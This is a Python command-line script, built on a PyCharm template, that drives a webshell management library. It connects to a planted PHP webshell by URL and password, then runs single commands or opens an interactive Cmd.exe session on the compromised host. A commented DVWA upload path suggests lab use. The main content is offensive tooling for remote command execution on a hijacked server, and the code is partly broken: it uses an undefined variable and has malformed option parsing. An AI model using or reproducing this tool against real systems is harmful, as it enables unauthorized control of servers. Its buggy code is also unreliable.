# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
from core.ShellEntity import ShellEntity
from core.ShellService import ShellService
from common import Types
import sys
import getopt
import threading
import time

def test(shellService :ShellService,context):
    time.sleep(2)
    print(shellService.realCMDOperate(Types.RealCMDOperateType.READ)[ 'msg' ])
    time.sleep(2)
    print(shellService.realCMDOperate(Types.RealCMDOperateType.WRITE, '', context + '\n')[ 'status' ])
    time.sleep(2)
    print(shellService.realCMDOperate(Types.RealCMDOperateType.READ)[ 'msg' ])

def sendRequestRealCMD(shellService :ShellService,realCMDOperateType, bashPath='', cmd='', delayTime=0):
    if delayTime > 0:
        time.sleep(delayTime)
    if realCMDOperateType is Types.RealCMDOperateType.CREATE:
        print(shellService.realCMDOperate(realCMDOperateType, bashPath)['status'])
    if realCMDOperateType is Types.RealCMDOperateType.WRITE:
        print(shellService.realCMDOperate(realCMDOperateType, bashPath, cmd)['status'])
    else:
        print(shellService.realCMDOperate(realCMDOperateType)['msg'])

def print_hi():
    url : str = ''
    ip =  ''
    password =''
    type =''
    context =''
    bool=''

    # shellEntity = ShellEntity(url, ip,password, Types.LanguageType.PHP, os='win')
    #
    # useAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36'
    # shellService = ShellService(shellEntity, useAgent, isUseProxies=True)
    argv = sys.argv[1:]

    try:
        opts, args = getopt.getopt(argv, "p:u:t:c:b:i",
                                   [ "password=",
                                     "url=" ,
                                     "ip=",
                                     "bool="
                                     "type=" ,
                                     "context="
                                        ])  # 长选项模式
    except:
        print("Error")


    for opt, arg in opts:
        if opt in [ '-p', '--password' ]:
            password = arg
        if opt in [ '-u', '--url' ]:
            url = arg
        if opt in [ '-t', '--type' ]:
            type = arg
        if opt in [ '-i', '--ip' ]:
            ip = argcmd
        if opt in [ '-b', '--bool' ]:
            bool = arg
        elif opt in [ '-c', '--context' ]:
            context = arg
    # url = 'http://192.168.217.130/dvwa/hackable/uploads/shell1.php'
    # print((url + type + context + ip))
    ip = url[ url.find('//') + 2:url.find(',', url.find('//') + 2) ]
    shellEntity = ShellEntity(url, ip, password, Types.LanguageType.PHP, os='win')

    useAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36'
    shellService = ShellService(shellEntity, useAgent, isUseProxies=bool)

    if(type == 'cmd'):
        print(shellService.runCmd(context))
    if(type == 'realcmd'):
        threads = [ ]
        t1 = threading.Thread(target=sendRequestRealCMD, args=(shellService,Types.RealCMDOperateType.CREATE, 'Cmd.exe'))
        t2 = threading.Thread(target=test, args=(shellService,context))
        threads.append(t1)
        threads.append(t2)
        for t in threads:
            t.start()
        for t in threads:
            t.join()








# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
